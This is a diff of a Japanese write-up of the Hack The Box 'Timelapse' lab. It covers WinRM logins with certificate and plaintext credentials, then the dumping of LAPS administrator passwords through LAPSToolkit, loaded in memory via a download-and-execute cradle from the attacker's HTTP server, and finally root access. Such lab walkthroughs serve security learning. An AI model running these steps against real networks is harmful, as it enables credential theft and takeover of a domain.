@@ -161,7 +161,7 @@ thuglegacy       (legacyy_dev_auth.pfx)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-pfxから公開鍵と秘密鍵の証明書を入手
+pfxから公開鍵証明書と秘密鍵を入手
 ```sh
 └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
 Enter Import Password:
@@ -173,7 +173,7 @@ Enter Import Password:
 -rw------- 1 kali kali 1952 Sep 28 08:42 privkey.pem
 -rw------- 1 kali kali 1232 Sep 28 08:41 cert.crt
 ```
-winrmでログイン成功！  
+5986番が開いていおり、winrmでログイン成功！  
 ユーザフラグゲット
 ```sh
 └─$ evil-winrm -S -c cert.crt -k privkey.pem -r timelapse.htb -i 10.129.227.113
@@ -520,7 +520,7 @@ You are NOT inside a container
        \---------------------------------------------------------------------------------/   
 ```
 powershellの履歴ファイルを発見
-```sh
+```powershell
 ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
     PowerShell v2 Version: 2.0
     PowerShell v5 Version: 5.1.17763.1
@@ -546,11 +546,154 @@ SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
 ```
-ldap経由でldapsを読み取り成功
+ということで、svc_deployでwinrmログイン成功！
 ```sh
-└─$ netexec ldap 10.129.227.113 -u 'timelapse.htb\svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
-LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
-LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
-LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
-LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:@@@k+lTm/&4iI5OjbG&K3npu
+└─$ evil-winrm -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.129.227.113               
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
+```
+
+
+## STEP 3
+svc_deployはLAPS_Readersグループに所属しているっぽい  
+名前からしてLAPS系のなにかっぽい
+```powershell
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net group LAPS_Readers /do
+Group name     LAPS_Readers
+Comment
+
+Members
+
+-------------------------------------------------------------------------------
+svc_deploy
+The command completed successfully.
+```
+どのグループがLAPSにアクセスできるか調査  
+[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)で調査
+```sh
+└─$ wget -nv https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1
+2025-10-02 08:12:27 URL:https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1 [94012/94012] -> "LAPSToolkit.ps1" [1]
+
+└─$ python3.13 -m http.server               
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+lapstoolkitのコマンドにより、LAPS_ReadersグループがLAPSを読み取れることを確認
+併せてdc01.timelapse.htbのローカル管理者のパスワードゲット！
+```powershell
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> IEX(new-object net.webclient).downloadstring('http://10.10.16.30:8000/LAPSToolkit.ps1')
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-LAPSDelegatedGroups
+
+OrgUnit                                    Delegated Groups
+-------                                    ----------------
+OU=Domain Controllers,DC=timelapse,DC=htb  TIMELAPSE\LAPS_Readers
+OU=Servers,DC=timelapse,DC=htb             TIMELAPSE\LAPS_Readers
+OU=Database,OU=Servers,DC=timelapse,DC=htb TIMELAPSE\LAPS_Readers
+OU=Web,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
+OU=Dev,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights
+
+ComputerName       Identity               Reason
+------------       --------               ------
+dc01.timelapse.htb TIMELAPSE\LAPS_Readers Delegated
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSComputers
+
+ComputerName       Password                 Expiration
+------------       --------                 ----------
+dc01.timelapse.htb 7@r[+C)c%/+9H2A9VQR.@D2D 10/07/2025 11:46:09
+```
+DCのローカル管理者はドメイン管理者であることを確認
+```powershell
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user administrator
+User name                    Administrator
+Full Name
+Comment                      Built-in account for administering the computer/domain
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/2/2025 11:46:09 AM
+Password expires             Never
+Password changeable          10/3/2025 11:46:09 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/23/2022 6:33:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Enterprise Admins    *Group Policy Creator
+                             *Domain Users         *Schema Admins
+                             *Domain Admins
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user administrator /do
+User name                    Administrator
+Full Name
+Comment                      Built-in account for administering the computer/domain
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/2/2025 11:46:09 AM
+Password expires             Never
+Password changeable          10/3/2025 11:46:09 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/23/2022 6:33:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Enterprise Admins    *Group Policy Creator
+                             *Domain Users         *Schema Admins
+                             *Domain Admins
+The command completed successfully.
+```
+lapsで取得したパスワードでadministratorログイン成功！
+ルートフラグゲット
+```sh
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\TRX\Desktop\root.txt
+323cf24b854b2e21c2903de92003ce24
 ```
